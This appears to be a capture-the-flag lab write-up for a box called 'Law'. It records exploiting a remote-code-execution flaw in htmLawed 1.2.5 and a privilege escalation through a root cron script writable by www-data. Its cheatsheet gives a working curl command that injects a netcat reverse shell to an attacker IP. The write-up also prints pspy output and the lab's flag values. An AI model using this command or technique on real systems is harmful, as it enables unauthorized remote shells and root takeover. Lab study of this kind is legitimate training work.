# Law \[Inter]

## Report

htmLawed version 1.2.5 is vulnerable to RCE via curl request. A script 'cleanup.sh' is run every minute as root which is editable by user 'www-data'. Append a reverse shell line to become root.

### Hint

Once linpeas output wasn't very promising, the next play is `pspy` - crontabs and `ps aux` only show authoirzed process snooping

## Cheatsheet

```
curl -s -d 'sid=foo&hhook=exec&text=busybox nc 192.168.49.56 8000 -e /bin/bash' -b 'sid=foo' http://192.168.56.190/index.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'

```

## Loot

### Enumeration

192.168.56.190

htmLawed (1.2.5) test vulnerable to RCE however, htmLawedtest.php not found so fuzz to find index.php which is our desired target

#### Software Installed

```
/usr/bin/base64                                                                                           
/usr/bin/curl
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget
```

### Attack Vectors

Straightforward RCE via curl request, however find the PHP endpoint manually cus we are not script kiddies lol

### PrivEsc

pspy is required

{% code title="Ripped it off" %}
```bash
<SNIP>
2025/08/04 16:57:01 CMD: UID=0     PID=23789  | /bin/sh -c /var/www/cleanup.sh 
2025/08/04 16:57:01 CMD: UID=0     PID=23790  | /bin/bash /var/www/cleanup.sh 
<SNIP>

-rwxr-xr-x  1 www-data www-data  125 Sep 25 00:14 cleanup.sh

```
{% endcode %}

### Creds

local.txt:77cda750298b7c4191c2edc83304a376

proof.txt:729f9f21aa991ef0e36e97185b94f9bd

### Proof
